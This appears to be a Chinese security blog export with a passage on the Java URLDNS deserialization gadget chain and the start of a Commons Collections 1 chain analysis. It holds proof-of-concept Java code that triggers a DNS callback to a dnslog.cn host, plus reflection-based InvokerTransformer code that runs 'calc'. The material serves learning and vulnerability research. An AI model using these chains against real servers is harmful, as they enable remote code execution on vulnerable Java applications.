class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这里有一个循环，先分析一下这个循环：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SuppressWarnings(&quot;unchecked&quot;)是Java中的一个注解，用于告诉编译器忽略在代码中出现的类型转换警告。在Java中，有些类型转换可能会导致运行时异常，例如ClassCastException，因此编译器会在代码中出现类型转换时发出警告。</span><br><span class="line"></span><br><span class="line">K key = (K) s.readObject();</span><br><span class="line"> 是HashMap类中的一个方法，用于从ObjectInputStream对象中读取一个键对象，并将其转换为泛型类型K。也就是进行反序列化后转换类型。</span><br><span class="line"> </span><br><span class="line">V value = (V) s.readObject();</span><br><span class="line"> 是HashMap类中的一个方法，用于从ObjectInputStream对象中读取一个值对象，并将其转换为泛型类型V</span><br><span class="line"> </span><br><span class="line">putVal(hash(key), key, value, false, false);</span><br><span class="line">  是HashMap类中的一个方法，用于将指定的键值对添加到HashMap中。</span><br><span class="line">首先，代码调用hash(key)方法计算出键的哈希值，以确定该键值对在HashMap中的位置。hash(key)方法是HashMap的一个私有方法，用于计算指定键的哈希值。</span><br><span class="line">接下来，代码调用putVal()方法将键值对添加到HashMap中。putVal()方法是HashMap的一个私有方法，用于将指定的键值对添加到HashMap中。它的参数包括哈希值、键、值、两个布尔值，用于指定是否需要覆盖已有的键值对以及是否需要扩容HashMap。</span><br></pre></td></tr></table></figure></div>

<p>其实整体来看就是通过遍历读取序列化后的键和值并将其反序列化后重新组成键值对</p>
<p>继续跟进hash(key)方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">     int h;</span><br><span class="line">     return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里key!&#x3D;null就会执行h &#x3D; key.hashCode()</p>
<p>到这里我们就可以找那些可以序列化的类中有hashcode方法（从触发点倒着分析这条利用链可能更好分析一点）。</p>
<p>重新回到urldns.java类分析</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421201715818.png"
                      alt="image-20230421201715818"
                ></p>
<p>可以看到首先实例化了一个URLStreamHandler类，然后又实例化了hashmap和URL类</p>
<p>然后是ht.put(u,url)向名为 <code>ht</code> 的 <code>Hashtable</code> 对象中添加一个新的键值对，其中 <code>u</code> 是键，<code>url</code> 是值。</p>
<p>跟进一下put方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421203006633.png"
                      alt="image-20230421203006633"
                ></p>
<p>可以看到这里调用了purval函数作为返回值</p>
<p>这里的key就是我们上面的url对，然后这里的key是作为hash()方法的参数，那我们继续跟进hash()方法：		</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421203213447.png"
                      alt="image-20230421203213447"
                ></p>
<p>跟进到hash方法后我们可以看到当key值就是我们的url对象不为null的时候会调用hashcode方法，这里的key就是url类的实例化对象。</p>
<p>在hash方法中，会调用key的hashCode方法，也就是说，通过创建一个HashMap对象，对该对象的key传入其他任意对象，再对HashMap实例进行序列化，再将其进行反序列化时，就会触发执行任意对象hashCode方法。</p>
<p>跟入查看URL类的hashcode()方法:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421203504776.png"
                      alt="image-20230421203504776"
                ></p>
<p>可以看到hashcode!&#x3D;-1会调用 handler的 <code>hashCode()</code> 方法</p>
<p>然后这里handler是<code>URLStreamHandler</code>的实例对象。</p>
<p>跟进一些<code>URLStreamHandler</code>的hashcode方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421205125569.png"
                      alt="image-20230421205125569"
                ></p>
<p>可以看到hashcode方法中调用了getHostAddress,传入的是url对象</p>
<p>然后返回url对象调用getHostAddress方法。</p>
<p>继续跟进getHostAddress方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421205444974.png"
                      alt="image-20230421205444974"
                ></p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421205600360.png"
                      alt="image-20230421205600360"
                ></p>
<p>这里就是我们这条利用链的最终触发点了，</p>
<p><code>InetAddress.getByName()</code> 是Java中的一个方法，它将主机名或IP地址字符串作为参数，并返回一个表示其网络地址的 <code>InetAddress</code> 对象。如果参数是主机名，<code>getByName()</code> 方法将查询DNS以查找该主机名的IP地址。如果参数是IP地址字符串，则该方法将返回一个表示该IP地址的 <code>InetAddress</code> 对象。该方法可能会抛出 <code>UnknownHostException</code> 异常，如果主机名无法解析或IP地址无效，则会抛出该异常。</p>
<p>这里根据主机名获取ip地址会进行一次DNS查询</p>
<p>这里进行一个小demo吧：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package ysoserial.test2;</span><br><span class="line"></span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line">public class getHostAddressTest &#123;</span><br><span class="line">    public static void main(String[] args) throws UnknownHostException &#123;</span><br><span class="line">        String host =&quot;baidu.com&quot;;</span><br><span class="line">        InetAddress hostAddess = InetAddress.getByName(host);</span><br><span class="line">        System.out.println(hostAddess.getHostAddress());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230422182109428.png"
                      alt="image-20230422182109428"
                ></p>
<p>可以看到对域名进行了一次解析，那么我们就可以通过这里来验证是否存在反序列化漏洞。</p>
<p>那么经过上面的分析，我们可以得到一个利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap-&gt;readObject</span><br><span class="line">HashMap-&gt;hash</span><br><span class="line">URL-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;getHostAddress</span><br><span class="line">URL-&gt;getHostAddress</span><br><span class="line">    -&gt; InetAddress.getByName(host)</span><br></pre></td></tr></table></figure></div>

<p>整体来说就是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            URL.hashCode()</span><br></pre></td></tr></table></figure></div>

<p>经过上面的分析我们对urldns利用链有了一定的了解，但是大家这里就会有一个疑问，既然最终调用的是url类里面的hashcode，为什么还要从hashmap类入手呢？</p>
<p>这是因为在url类里面的readobject里面并没有调用hashcode，所以我们想要使用这条链就要找到一个在反序列化过程中调用了hashcode的类，而使用hashcode方法最多的自然是hashmap结构，而我们进入hashmap类的源码可以看到，其readObject方法在最后调用了hash方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203107013.png"
                      alt="image-20230714203107013"
                ></p>
<p>跟进hash方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203153750.png"
                      alt="image-20230714203153750"
                ></p>
<p>可以看到这里调用了url类的hashcode方法，这也是我们为什么要从hashmap类入手的原因</p>
<p>上面我们从正面分析了从hashmap到url类的hashcode是如何触发dns解析</p>
<p>回到hashmap的readobject方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line">    putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure></div>

<p>key 是从<code>K key = (K) s.readObject();</code> 这段代码，也是就是readObject中得到的，说明之前在writeObject会写入key</p>
<p>进入到hashmapwriteObject</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230715085510298.png"
                      alt="image-20230715085510298"
                ></p>
<p>可以看到这里最后调用了internalWriteEntries方法</p>
<p>跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230715085612835.png"
                      alt="image-20230715085612835"
                ></p>
<p>可以看到这里的key和value都是从tables中获取的，而table的值就是hashmap中的table的值</p>
<p>那我们想要修改table的值就需要调用hashmap中的put方法</p>
<p>但是hashmap中的put方法也会对key调用一次hash方法，所以在这里会产生第一次dns查询</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">        return putVal(hash(key), key, value, false, true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>为了避免这一次的dns查询，ysoserial 中使用<code>SilentURLStreamHandler</code> 方法，直接返回null，并不会像<code>URLStreamHandler</code>那样去调用一系列方法最终到<code>getByName</code>，因此也就不会触发dns查询了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230715085934670.png"
                      alt="image-20230715085934670"
                ></p>
<p>或者在生成paylaod的时候将hashcode的值设为除-1外其他的.</p>
<p>通过上面的分析我们自己来写一条pop链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class UrlDns &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://s0y1rl.dnslog.cn/&quot;);</span><br><span class="line">       Field hashCode = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);//通过反射获取到hashcode</span><br><span class="line">        hashCode.setAccessible(true);//绕过java语言权限控制检查权限</span><br><span class="line">        hashCode.set(url, 0);//设置hashcode的值为其他数字</span><br><span class="line">        hashMap.put(url, null);//调用hashmap对象中的put方法，此时hashcode不为-1不触发dns查询</span><br><span class="line">        hashCode.set(url, -1);//将hashcode重新赋值为-1</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p>这里通过dnslog来进行测试</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203318902.png"
                      alt="image-20230714203318902"
                ></p>
<p>运行代码后：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203413133.png"
                      alt="image-20230714203413133"
                ></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonCollections1利用链分析</title>
    <url>/2023/07/18/CommonCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>前面分析了URLDNS利用链，cc1这条链的难度与urldns相比真的难了很多，从开始分析到写完这篇文章花了三四天的时间，但是这条链相比与urldns学到了更多。</p>
<p>Apache Commons Collections是一个第三方的基础类库，它提供了许多功能强大的数据结构类型，并实现了各种集合工具类。作为Apache开源项目的重要组件，CommonsCollections1是指反序列化攻击中的第一种RCE（远程代码执行）序列化链。这个漏洞点仍然存在于commons-collections-3.1版本中。</p>
<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><p>新建一个maven项目，使用jdk&lt;&#x3D;8u71</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718200432685.png"
                      alt="image-20230718200432685"
                ></p>
<p>我们这里分析的都是反编译的代码，在Java中有一部分文件的源码是无法看到的，只能查看该文件的class文件，这里就可以用开源java代码进行替换</p>
<p>链接：<a class="link"   href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4" >https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下载zip文件</p>
<p>解压后将其复制到jdk所在文件夹中src.zip解压后的src目录中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718200900265.png"
                      alt="image-20230718200900265"
                ></p>
<p>然后打开项目结构-&gt;sdk</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230718200937261.png"
                      alt="image-20230718200937261"
                ></p>
<p>将源码添加进去</p>
<p>然后在构建好的maven项目中导入依赖</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></div>

<h1 id="二、cc1利用链分析"><a href="#二、cc1利用链分析" class="headerlink" title="二、cc1利用链分析"></a>二、cc1利用链分析</h1><h2 id="cc1-TransformedMap利用链分析"><a href="#cc1-TransformedMap利用链分析" class="headerlink" title="cc1 TransformedMap利用链分析"></a>cc1 TransformedMap利用链分析</h2><p>这条利用链的漏洞点在于InvokerTransformer类下面的transform方法</p>
<p>我们先看一下这个transform方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            return method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);</span><br><span class="line">        &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);</span><br><span class="line">        &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到它实现的功能和反射非常像，获取类对象和方法，然后通过invoke方法去执行这个方法</p>
<p>那我们就可以利用这一点进行rce</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure></div>

<p>这是我们正常去执行打开计算器的一个代码</p>
<p>那我们也可以通过反射来写</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">Class c =Runtime.class;</span><br><span class="line">Method execMthode=c.getMethod(&quot;exec&quot;,String.class);</span><br><span class="line">execMthode.invoke(r,&quot;calc&quot;);</span><br></pre></td></tr></table></figure></div>

<p>我们首先通过反射获取到了 虚拟机的运行时对象 <code>Runtime</code>，然后从 <code>Runtime</code> 类中获取名为 “exec”，参数类型为 <code>String</code> 的方法对象 <code>execMethod</code>最后通过invoke在我们获取的java虚拟机对象上面执行我们的命令。</p>
<p>我们上面说InvokerTransformer类下面的transform方法实现的功能和我们这个是非常相似的</p>
<p>那我们也可以通过InvokerTransformer类下面的transform方法来实现这个弹计算器的命令</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br></pre></td></tr></table></figure></div>

<p>我们运行看一下效果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717104959679.png"
                      alt="image-20230717104959679"
                ></p>
<p>可以看到正常执行了运行计算器程序的命令</p>
<p>我们打断点看一下这个过程：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717105102698.png"
                      alt="image-20230717105102698"
                ></p>
<p>首先是InvokerTransformer类的构造方法接受我们传进去的参数然后进行赋值</p>
<pre><code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;
    super();
    iMethodName = methodName;
    iParamTypes = paramTypes;
    iArgs = args;
&#125;
</code></pre>
<p>然后调用InvokerTransformer类下面的transform方法</p>
<p>跟进</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717105219304.png"
                      alt="image-20230717105219304"
                ></p>
<p>变量值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717105237111.png"
                      alt="image-20230717105237111"
                ></p>
<p>通过这个变量值我们可以看到这里同样是获取到类对象，然后获取相应的方法，然后调用invoke去执行打开计算器的命令。</p>
<p>通过上面的分析，我们已经明白如何去利用这个漏洞进行命令执行</p>
<p>但是我们要想对这个点进行利用我们要向上找哪里调用了transform方法，最终一直到readobject方法，我们这条链才能利用。</p>
<p>那么我先看一下哪里调用了transform方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717110046541.png"
                      alt="image-20230717110046541"
                ></p>
<p>通过查找调用我们可以看到很多方法里面都调用了transform方法</p>
<p>如果是正常进行进行一个新的利用链挖掘的话，我们就要一个个类进行分析</p>
<p>但是我们这里是为了学习分析这条利用链，就不一个个类分析了。</p>
<p>在cc1这条利用链里面我们用的是TransformedMap中的checkSetValue方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在checksetValue方法中valueTransformer调用了transform</p>
<p>但是我们并不知道valueTransformer是否可控，只要可控我们才能够进行利用</p>
<p>向上找一下valueTransformer的实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    super(map);</span><br><span class="line">    this.keyTransformer = keyTransformer;</span><br><span class="line">    this.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这个valueTransformer是TransformedMap类的构造方法的一个参数</p>
<p>那么这样valueTransformer的值我们就是可控的</p>
<p>但是TransformedMap的构造方法是 protected 我们不能够直接调用</p>
<p>继续向上查看调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">    return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后我们在TransformedMap类中找到了一个静态方法decorate方法</p>
<p>这里返回了一个TransformedMap对象，那我们可以通过这个静态方法调用TransformedMap的构造方法，进而控制valueTransformer的值。</p>
<p>那么根据我们上面的分析我们，可以简单画个流程图。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717113328116.png"
                      alt="image-20230717113328116"
                ></p>
<p>那么按照上面的分析我们可以写出我们这部分的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">InvokerTransformer invokerTransformer= new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">HashMap&lt;Object,Object&gt; map =new HashMap&lt;&gt;();</span><br><span class="line">map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">TransformedMap.decorate(map,null,invokerTransformer);</span><br></pre></td></tr></table></figure></div>

<p>到这里valueTransformer可控，说明我们后门的链子可以正常进行，但是我们要找到的入口点是readobject</p>
<p>所以继续向上找哪里调用了checkSetvalue方法</p>
<p>继续查找checkSetvalue的用法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717121345208.png"
                      alt="image-20230717121345208"
                ></p>
<p>可以看到这个只有AbstractInputCheckedMapDecorator类中的 setValue方法符合我们的要求</p>
<p>而且我们也可以发现transformedMap继承了这个AbstractInputCheckedMapDecorator类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717162322837.png"
                      alt="image-20230717162322837"
                ></p>
<p>跟进setValue方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static class MapEntry extends AbstractMapEntryDecorator &#123;</span><br><span class="line"></span><br><span class="line">       /** The parent map */</span><br><span class="line">       private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">       protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">           super(entry);</span><br><span class="line">           this.parent = parent;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       public Object setValue(Object value) &#123;</span><br><span class="line">           value = parent.checkSetValue(value);</span><br><span class="line">           return entry.setValue(value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码中MapEntry是<code>AbstractInputCheckedMapDecorator</code> 内部的一个静态内部类。它继承自 <code>AbstractMapEntryDecorator</code>，扩展了 <code>Map.Entry</code> 接口的实现。这个 <code>MapEntry</code> 类的目的是包装原始的 <code>Map.Entry</code> 对象并重写了map类中的setvalue方法，构造方法 <code>MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</code> 接收一个原始的 <code>Map.Entry</code> 对象和父级装饰器对象作为参数。在构造方法中，通过调用父类 <code>AbstractMapEntryDecorator</code> 的构造方法，将原始的 <code>Map.Entry</code> 对象包装起来。</p>
<p>通过分析代码我们可以知道这里的setvalue就是重写了map中的setvalue方法，我们如果要触发这个setvalue方法要通过<code>Map.Entry</code> 对象来调用它。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717162734633.png"
                      alt="image-20230717162734633"
                ></p>
<p>在前面我们通过decorate这个静态方法装饰了我们定义的map对象，那么我们只要遍历这个装饰过的map获得map.entry对象，就可以调用setvalue方法，那我们调用了setValue方法就能够执行checksetvalue的调用</p>
<p>我们这里以循环来获取Map.Entry对象</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for(Map.Entry entry: transformedMap.entrySet())&#123;</span><br><span class="line">          System.out.println(entry);</span><br><span class="line">           entry.setValue(r);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p>或者迭代器</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map.Entry&lt;Object, Object&gt; entry = transformedMap.entrySet().iterator().next();</span><br><span class="line">entry.setValue(r);</span><br></pre></td></tr></table></figure></div>

<p>我们这里遍历我们上面经过decorate修饰过的map获取到map.entry对象，然后去调用setValue方法</p>
<p>那根据上面的分析我们就可以继续编写我们的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class cc1blog &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        InvokerTransformer invokerTransformer= new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map =new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;key&quot;,&quot;value&quot;);</span><br><span class="line">        map.put(&quot;1&quot;,&quot;2&quot;);</span><br><span class="line">       for(Map.Entry entry: transformedMap.entrySet())&#123;</span><br><span class="line">          System.out.println(entry);</span><br><span class="line">           entry.setValue(r);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行看一下结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717163607591.png"
                      alt="image-20230717163607591"
                ></p>
<p>当我们获取到map.entry对象时，调用即执行到entry.setvalue()时，这里的entry是我们获取到的一个对象，其实就是我们经过装饰的transformedMap对象，但是transformedMap没有setvalue方法，那么就会调用父类里面的setvalue方法</p>
<p> 我们在这里打个断点具体分析一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717165156184.png"
                      alt="image-20230717165156184"
                ></p>
<p>然后调用checkSetValue方法</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717165225350.png"
                      alt="image-20230717165225350"
                ></p>
<p>继续跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717165241778.png"
                      alt="image-20230717165241778"
                ></p>
<p>可以看到最终来到了transform进行命令执行</p>
<p>那么到这里我们只要找到一个能够遍历map的地方然后还调用了setvalue那么我们这条链就能够执行我们后门的利用链。</p>
<p>继续向上查找setValue的用法:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230717165931967.png"
                      alt="image-20230717165931967"
                ></p>
<p>可以看到我们在AnnotationInvocationHandler里面的readobject方法里面找到了对setValue的调用</p>
